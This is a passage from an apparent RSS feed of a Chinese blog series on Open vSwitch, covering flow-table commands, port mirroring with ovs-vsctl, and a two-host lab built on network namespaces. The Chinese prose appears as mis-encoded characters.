&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# æŸ¥çœ‹br-tunä¸Šçš„å…¨éƒ¨æµè¡¨è§„åˆ™&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-ofctl dump-flows br-tun
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;æ·»åŠ æˆ–ä¿®æ”¹æµè¡¨è§„åˆ™&#34;&gt;æ·»åŠ æˆ–ä¿®æ”¹æµè¡¨è§„åˆ™&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-ofctl addâˆ’flowï¼addâˆ’flowsï¼modâˆ’flows â€œæµè¡¨åŒ¹é…æ¡ä»¶,actions&lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt;åŠ¨ä½œ1&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;,åŠ¨ä½œ2â€¦&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;â€
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚æœä½ æœ‰è¿‡ç¼–ç¨‹çš„ç»éªŒï¼Œæµè¡¨è§„åˆ™å…¶å®å°±æ˜¯ä¸€ä¸ªä¸ªç®€å•çš„&lt;code&gt;if&lt;/code&gt;è¯­å¥ï¼Œä¼ªä»£ç å¦‚ä¸‹ã€‚&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if (æµè¡¨åŒ¹é…æ¡ä»¶){
	åŠ¨ä½œ1ï¼Œ
	åŠ¨ä½œ2...
}

if (æµè¡¨åŒ¹é…æ¡ä»¶){
	åŠ¨ä½œ1ï¼Œ
	åŠ¨ä½œ2...
}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;åˆ é™¤æµè¡¨è§„åˆ™&#34;&gt;åˆ é™¤æµè¡¨è§„åˆ™&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# åˆ é™¤br-tunä¸Šçš„å…¨éƒ¨æµè¡¨è§„åˆ™&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-ofctl del-flows br-tun
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# åˆ é™¤br-tunä¸ŠåŒ¹é…xxçš„å…¨éƒ¨æµè¡¨è§„åˆ™&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-ofctl del-flows br-tun xx  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;æµè¡¨åŒ¹é…æ¡ä»¶&#34;&gt;æµè¡¨åŒ¹é…æ¡ä»¶&lt;/h1&gt;
&lt;p&gt;OVS æµè¡¨åŒ¹é…æ¡ä»¶è¾ƒå¤šï¼Œä¸‹é¢æˆ‘å°†å…¶åˆ†æˆå››éƒ¨åˆ†æ¥è¯´æ˜ï¼Œåˆ†åˆ«æ˜¯:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OVSåŒ¹é…æ¡ä»¶&lt;/li&gt;
&lt;li&gt;OSIæ¨¡å‹ç¬¬äºŒå±‚ã€æ•°æ®é“¾è·¯å±‚ã€‘&lt;/li&gt;
&lt;li&gt;OSIæ¨¡å‹ç¬¬ä¸‰å±‚ã€ç½‘ç»œå±‚ã€‘&lt;/li&gt;
&lt;li&gt;OSIæ¨¡å‹ç¬¬å››å±‚ã€ä¼ è¾“å±‚ã€‘&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ovsåŒ¹é…æ¡ä»¶&#34;&gt;OVSåŒ¹é…æ¡ä»¶&lt;/h2&gt;
&lt;h3 id=&#34;in_portport&#34;&gt;in_port=port&lt;/h3&gt;
&lt;p&gt;æµé‡è¿›å…¥çš„ç«¯å£ç¼–å·æˆ–è€…åç§°ï¼Œç¤ºä¾‹ &lt;code&gt;in_port=br-int&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;tablenumber&#34;&gt;table=number&lt;/h3&gt;
&lt;p&gt;è§„åˆ™ä¿å­˜çš„æµè¡¨ç¼–å·ï¼ŒèŒƒå›´æ˜¯ 0-254ï¼Œé»˜è®¤å€¼ï¼š0ã€‚&lt;/p&gt;
&lt;h2 id=&#34;osiæ¨¡å‹ç¬¬äºŒå±‚æ•°æ®é“¾è·¯å±‚&#34;&gt;OSIæ¨¡å‹ç¬¬äºŒå±‚ã€æ•°æ®é“¾è·¯å±‚ã€‘&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;&lt;code&gt;dl&lt;/code&gt; å³æ˜¯ &lt;code&gt;data link&lt;/code&gt; çš„ç¼©å†™ã€‚&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&#34;dl_typeethertype&#34;&gt;dl_type=ethertype&lt;/h3&gt;
&lt;p&gt;åŒ¹é…ä»¥å¤ªç½‘åè®®ç±»å‹ä»¥å¤ªç±»å‹ï¼Œä»¥10åˆ°65535ä¹‹é—´çš„æ•´æ•°ï¼ˆåŒ…æ‹¬0å’Œ65535ï¼‰æŒ‡å®šï¼Œä»¥åè¿›åˆ¶æˆ–ä»¥0xå‰ç¼€çš„åå…­è¿›åˆ¶æ•°è¡¨ç¤ºï¼Œç¤ºä¾‹å¦‚ä¸‹ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;dl_type=0x0800&lt;/code&gt; åŒ¹é…IPv4æ•°æ®åŒ…ï¼Œç­‰åŒäº&lt;code&gt;dl_type=ip&lt;/code&gt; ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;dl_type=0x086dd&lt;/code&gt; åŒ¹é…IPv6æ•°æ®åŒ…ï¼Œç­‰åŒäº&lt;code&gt;dl_type=ipv6&lt;/code&gt; ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;dl_type=0x0806&lt;/code&gt; åŒ¹é…ARPæ•°æ®åŒ…ï¼Œç­‰åŒäº&lt;code&gt;dl_type=arp&lt;/code&gt; ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;dl_type=0x8035&lt;/code&gt; åŒ¹é…RARPæ•°æ®åŒ…ï¼Œç­‰åŒäº &lt;code&gt;dl_type=rarp&lt;/code&gt;ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Open vSwitch å…¥é—¨å®è·µï¼ˆ4ï¼‰ä½¿ç”¨OVSé…ç½®ç«¯å£é•œåƒ</title>
      <link>https://www.typesafe.cn/posts/ovs-learn-4/</link>
      <pubDate>Mon, 28 Dec 2020 19:23:00 +0000</pubDate>
      <guid>https://www.typesafe.cn/posts/ovs-learn-4/</guid>
      <description>&lt;h1 id=&#34;å‰è¨€&#34;&gt;å‰è¨€&lt;/h1&gt;
&lt;p&gt;å½“æˆ‘ä»¬æƒ³è¦åœ¨ä¸å½±å“è™šæ‹Ÿç½‘ç»œè®¾å¤‡æ•°æ®æŠ¥æ–‡æ”¶å‘çš„æƒ…å†µä¸‹è·å–å¯¹åº”è™šæ‹Ÿç½‘ç»œè®¾å¤‡çš„æµé‡æ—¶ï¼Œç«¯å£é•œåƒæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ã€‚ç«¯å£é•œåƒæ˜¯æŒ‡å°†ç»è¿‡æŒ‡å®šç«¯å£ï¼ˆé•œåƒç«¯å£ï¼‰çš„æŠ¥æ–‡å¤åˆ¶ä¸€ä»½åˆ°å¦ä¸€ä¸ªæŒ‡å®šç«¯å£ï¼ˆè§‚å¯Ÿç«¯å£ï¼‰ï¼Œé€šè¿‡è§‚å¯Ÿç«¯å£æ¥æ”¶åˆ°çš„æ•°æ®æŠ¥æ–‡ï¼Œå°±å¯ä»¥æœ‰æ•ˆè¯†åˆ«è™šæ‹Ÿç½‘ç»œçš„è¿è¡Œæƒ…å†µã€‚&lt;/p&gt;
&lt;p&gt;OVSæä¾›äº†ç›¸å…³å‘½ä»¤æ¥é…ç½®æˆ–åˆ é™¤ç«¯å£é•œåƒï¼Œä¸‹é¢æˆ‘ä»¬æ¥å®éªŒä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;h1 id=&#34;å¦‚ä½•ä½¿ç”¨&#34;&gt;å¦‚ä½•ä½¿ç”¨&lt;/h1&gt;
&lt;h3 id=&#34;ç«¯å£é•œåƒç±»å‹&#34;&gt;ç«¯å£é•œåƒç±»å‹&lt;/h3&gt;
&lt;p&gt;ç«¯å£é•œåƒåˆ†ä¸ºé•œåƒæºå’Œé•œåƒç›®çš„ä¸¤éƒ¨åˆ†ã€‚&lt;/p&gt;
&lt;h4 id=&#34;é•œåƒæº&#34;&gt;é•œåƒæº&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;select_allï¼šå¸ƒå°”ç±»å‹ï¼ˆtrueï¼Œfalseï¼‰ã€‚è®¾ç½®ä¸º true æ—¶ï¼Œè¡¨ç¤ºæ­¤ç½‘æ¡¥ä¸Šçš„æ‰€æœ‰æµé‡ã€‚&lt;/li&gt;
&lt;li&gt;select_dst_portï¼šå­—ç¬¦ä¸²ï¼ˆç«¯å£åç§°ï¼‰ã€‚è¡¨ç¤ºæ­¤ç«¯å£æ¥æ”¶çš„æ‰€æœ‰æµé‡ã€‚&lt;/li&gt;
&lt;li&gt;select_src_portï¼šå­—ç¬¦ä¸²ï¼ˆç«¯å£åç§°ï¼‰ã€‚è¡¨ç¤ºæ­¤ç«¯å£å‘é€çš„æ‰€æœ‰æµé‡ã€‚&lt;/li&gt;
&lt;li&gt;select_vlanï¼šæ•´å‹ï¼ˆ0-4095ï¼‰ã€‚è¡¨ç¤ºæºå¸¦æ­¤VLANæ ‡ç­¾çš„æµé‡ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;é•œåƒç›®çš„&#34;&gt;é•œåƒç›®çš„&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;output_portï¼šå­—ç¬¦ä¸²ï¼ˆç«¯å£åç§°ï¼‰ã€‚æ¥æ”¶æµé‡æŠ¥æ–‡çš„è§‚å¯Ÿç«¯å£ã€‚&lt;/li&gt;
&lt;li&gt;output_vlanï¼šæ•´å‹ï¼ˆ0-4095ï¼‰ã€‚è¡¨ç¤ºåªä¿®æ”¹VLANæ ‡ç­¾ï¼ŒåŸVLANæ ‡ç­¾ä¼šè¢«å‰¥ç¦»ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;åŸºç¡€æ“ä½œå‘½ä»¤&#34;&gt;åŸºç¡€æ“ä½œå‘½ä»¤&lt;/h3&gt;
&lt;p&gt;æ–°å¢ç«¯å£é•œåƒ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-vsctl -- set Bridge &amp;lt;bridge_name&amp;gt; mirrors&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;@m &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt; -- --id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;@&amp;lt;port0&amp;gt; get Port &amp;lt;port0&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt; -- --id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;@&amp;lt;port1&amp;gt; get Port &amp;lt;port1&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt; -- --id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;@m create Mirror name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;lt;mirror_name&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt;-dst-port&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;@&amp;lt;port0&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt;-src-port&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;@&amp;lt;port0&amp;gt; output-port&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;@&amp;lt;port1&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;è¿™è¡Œå‘½ä»¤ä¼šè¾“å‡ºä¸€ä¸ªé•œåƒID&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;åˆ é™¤ç«¯å£é•œåƒ&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ovs-vsctl remove Bridge &amp;lt;bridge-name&amp;gt; mirrors &amp;lt;mirror-id&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;åœ¨åŸç«¯å£é•œåƒçš„åŸºç¡€ä¸Šå¢åŠ ä¸€ä¸ªé•œåƒæº&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# è·å–ç«¯å£çš„ID&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-vsctl get port &amp;lt;port_name&amp;gt; _uuid
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# åœ¨åŸç«¯å£é•œåƒçš„åŸºç¡€ä¸Šå¢åŠ é•œåƒæº&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-vsctl add Mirror &amp;lt;mirror-name&amp;gt; select_src_port &amp;lt;port-id&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-vsctl add Mirror &amp;lt;mirror-name&amp;gt; select_dst_port &amp;lt;port-id&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨åŸç«¯å£é•œåƒçš„åŸºç¡€ä¸Šåˆ é™¤ä¸€ä¸ªé•œåƒæº&lt;/p&gt;</description>
    </item>
    <item>
      <title>Open vSwitch å…¥é—¨å®è·µï¼ˆ3ï¼‰ä½¿ç”¨OVSæ„å»ºåˆ†å¸ƒå¼éš”ç¦»ç½‘ç»œ</title>
      <link>https://www.typesafe.cn/posts/ovs-learn-3/</link>
      <pubDate>Sun, 27 Dec 2020 11:38:00 +0000</pubDate>
      <guid>https://www.typesafe.cn/posts/ovs-learn-3/</guid>
      <description>&lt;h1 id=&#34;ä½¿ç”¨ovsæ„å»ºåˆ†å¸ƒå¼éš”ç¦»ç½‘ç»œ&#34;&gt;ä½¿ç”¨OVSæ„å»ºåˆ†å¸ƒå¼éš”ç¦»ç½‘ç»œ&lt;/h1&gt;
&lt;h2 id=&#34;å‰è¨€&#34;&gt;å‰è¨€&lt;/h2&gt;
&lt;p&gt;ä¸Šä¸€èŠ‚æˆ‘ä»¬ä½¿ç”¨OVSæ„å»ºäº†å•æœºéš”ç¦»ç½‘ç»œï¼Œä½†æ˜¯éšç€ç½‘ç»œè§„æ¨¡çš„æ‰©å¼ ï¼Œå•èŠ‚ç‚¹å·²ç»ä¸å†èƒ½æ»¡è¶³ä¸šåŠ¡çš„éœ€è¦ï¼Œåˆ†å¸ƒå¼ç½‘ç»œæˆäº†å¿…ä¸å¯å°‘çš„ç¯èŠ‚ã€‚åˆ†å¸ƒå¼ç½‘ç»œä¸å•èŠ‚ç‚¹ç½‘ç»œåœ¨ç»†èŠ‚å®ç°ä¸ŠåŸºæœ¬ä¸€è‡´ï¼Œåªæœ‰ç‰©ç†ç¯å¢ƒç½‘ç»œè¿çº¿ä¸Šçš„ä¸€ç‚¹åŒºåˆ«ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å®éªŒ1åˆ†å¸ƒå¼æ— éš”ç¦»ç½‘ç»œ&#34;&gt;å®éªŒ1ï¼šåˆ†å¸ƒå¼æ— éš”ç¦»ç½‘ç»œ&lt;/h2&gt;
&lt;p&gt;ç½‘ç»œæ‹“æ‰‘å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬æ¯ä¸€å°èŠ‚ç‚¹éƒ½æœ‰ä¸¤å¼ ç½‘å¡ï¼Œä¸€å¼ ç”¨äºç®¡ç†ï¼Œä¸€å¼ ç”¨äºä¸šåŠ¡ã€‚ä¹‹æ‰€ä»¥ä½¿ç”¨ä¸¤å¼ ç½‘å¡æœ‰ä¸¤ä¸ªåŸå› ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç®¡ç†ç½‘å¡ç”¨äºæ—¥å¸¸çš„ç»´æŠ¤ç™»å½•ï¼Œä¸šåŠ¡ç½‘å¡ç”¨äºä¼ è¾“è™šæ‹ŸèŠ‚ç‚¹çš„æ•°æ®æŠ¥æ–‡ï¼Œé¿å…ç›¸äº’ä¹‹é—´å½±å“ã€‚&lt;/li&gt;
&lt;li&gt;æˆ‘ä»¬è¦å°†ä¸šåŠ¡ç½‘å¡ç»‘å®šåˆ°OVSç½‘æ¡¥ä¸Šï¼Œä¹Ÿå°±æ˜¯&lt;code&gt;Normal&lt;/code&gt;ç±»å‹çš„&lt;code&gt;Port&lt;/code&gt;ã€‚è¿™ç§æ–¹å¼æ·»åŠ çš„&lt;code&gt;Port&lt;/code&gt;ä¸æ”¯æŒåˆ†é…IPåœ°å€ï¼Œå¦‚æœä¹‹å‰ç½‘å¡ä¸Šé…ç½®çš„æœ‰IPï¼ŒæŒ‚è½½åˆ°OVSä¸Šé¢ä¹‹åå°†ä¸å¯è®¿é—®ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæ˜¯ä½¿ç”¨ç‰©ç†ç¯å¢ƒæ­å»ºç½‘ç»œæ‹“æ‰‘ï¼Œéœ€è¦æŠŠä¸šåŠ¡ç½‘å¡å¯¹åº”çš„äº¤æ¢æœºç«¯å£é…ç½®ä¸º&lt;code&gt;trunk&lt;/code&gt;æ¨¡å¼ã€‚å¦‚æœæ˜¯ä½¿ç”¨VmWareæ­å»ºç½‘ç»œæ‹“æ‰‘ï¼Œä¸šåŠ¡ç½‘å¡éœ€è¦é…ç½®ç½‘ç»œç±»å‹ä¸º&lt;code&gt;ä»…ä¸»æœºæ¨¡å¼&lt;/code&gt;ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;img alt=&#34;åˆ†å¸ƒå¼æ— éš”ç¦»ç½‘ç»œ&#34; loading=&#34;lazy&#34; src=&#34;https://oss.typesafe.cn/ovs-di-network0.png?t=2&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;é…ç½®&#34;&gt;é…ç½®&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;é…ç½®ç¯å¢ƒ &lt;code&gt;ä¸»æœºA&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-vsctl add-br br-int
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# è¯·ä¿®æ”¹eth1ä¸ºå½“å‰å®éªŒç¯å¢ƒçš„ä¸šåŠ¡ç½‘å¡åç§°&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-vsctl add-port br-int eth1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# æ·»åŠ ä¸¤ä¸ªå†…éƒ¨ç«¯å£&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;internal
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;internal
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# æ·»åŠ ä¸¤ä¸ªnetns&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns add ns0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns add ns1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# å°†å†…éƒ¨ç«¯å£åˆ†åˆ«ç§»åŠ¨åˆ°netnsä¸­&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip link set vnet0 netns ns0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip link set vnet1 netns ns1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# å¯åŠ¨ç«¯å£å¹¶é…ç½®IP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns0 ip link set lo up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns0 ip link set vnet0 up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns0 ip addr add 10.0.0.1/24 dev vnet0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns1 ip link set lo up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns1 ip link set vnet1 up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns1 ip addr add 10.0.0.2/24 dev vnet1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;é…ç½®ç¯å¢ƒ &lt;code&gt;ä¸»æœºB&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-vsctl add-br br-int
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# è¯·ä¿®æ”¹eth1ä¸ºå½“å‰å®éªŒç¯å¢ƒçš„ä¸šåŠ¡ç½‘å¡åç§°&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-vsctl add-port br-int eth1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# æ·»åŠ ä¸¤ä¸ªå†…éƒ¨ç«¯å£&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;internal
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;internal
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# æ·»åŠ ä¸¤ä¸ªnetns&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns add ns0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns add ns1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# å°†å†…éƒ¨ç«¯å£åˆ†åˆ«ç§»åŠ¨åˆ°netnsä¸­&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip link set vnet0 netns ns0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip link set vnet1 netns ns1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# å¯åŠ¨ç«¯å£å¹¶é…ç½®IP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns0 ip link set lo up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns0 ip link set vnet0 up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns0 ip addr add 10.0.0.3/24 dev vnet0
